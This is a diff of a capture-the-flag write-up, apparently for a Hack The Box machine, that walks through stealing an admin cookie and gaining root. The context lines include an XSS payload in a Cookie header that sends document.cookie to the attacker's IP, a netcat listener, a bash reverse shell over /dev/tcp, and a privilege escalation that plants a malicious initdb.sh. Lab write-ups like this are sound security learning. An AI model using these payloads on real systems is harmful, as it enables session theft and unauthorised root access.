@@ -11,7 +11,7 @@ The website appears to be under construction. We also notice that HTTP requests 
 is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
 ```
 We try to see whether it's written in base 64:
-```
+```sh
 $ echo InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs | base64 -d
 "user"base64: invalid input
 ```
@@ -23,20 +23,20 @@ Finally, we use `feroxbuster` to bruteforce the website directories. We find 2 o
 
 ## 🍪 Playing with the form
 The contact form contains the following fields: first name, last name, email, phone number and message. Given that we want to steal that admin cookie, we begin by trying some POC XXS in the message field:
-```
+```html
 <script>alert('AAA')</script>
 ```
 The website is not happy about it, as it returns a "Hacking Attempt Detected" page, stating that the admin will be notified, and printing on screen the header of our POST request. Interesting... 
 If the admin visualizes on screen the same exact header of our request, then we can inject some HTML script in it, and get the admin cookie nicely delivered to us!
 
 To do so, we add a new, not-at-all-sketchy cookie: 
-```
+```html
 Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs;xxs=<script>fetch("http://10.10.14.136:4815/?"+document.cookie)</script>
 ```
 where `10.10.14.136` is our vpn IP address.
 
 We also open a channel on port 4815 to see our cookie:
-```
+```sh
 $ nc -lvnkp 4815
 ```
 
@@ -59,7 +59,7 @@ Here we are using the classic `bash -c 'bash -i >& /dev/tcp/10.10.14.136/4815 0>
 
 ## 🫚 Becoming root and owning the ~~world~~ flag!
 Now that we have our shell, we begin with some exploration:
-```
+```sh
 $ whoami
 dvir
 $ sudo -l
@@ -71,7 +71,7 @@ From the HTB website, we know the flag is in the `/root` directory, which of cou
 However, we are still allowed to run this `/usr/bin/syscheck` script with root permissions. Interesting... 
 
 The script is not very long. The most interesting part is this "if" clause:
-```
+```sh
 if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
   /usr/bin/echo "Database service is not running. Starting it..."
   ./initdb.sh 2>/dev/null
@@ -82,12 +82,12 @@ fi
 While all the other commands are called with their full name, this `./initdb.sh` script is called with its relative path. Moreover, since it's called by a process with root privileges, it will also have root privileges. Very convenient...
 
 From our home directory (on which we have writing permissions), we create our own `initdb.sh` file. Useless to day, it will **__not__** initialize the database.
-```
+```sh
 $ echo bash > initdb.sh
 $ chmod +x initdb.sh
 ```
 Now we are ready to run the system check!
-```
+```sh
 $ sudo /usr/bin/syscheck
 Last Kernel Modification Time: 01/02/2024 10:05
 Available disk space: 1.5G
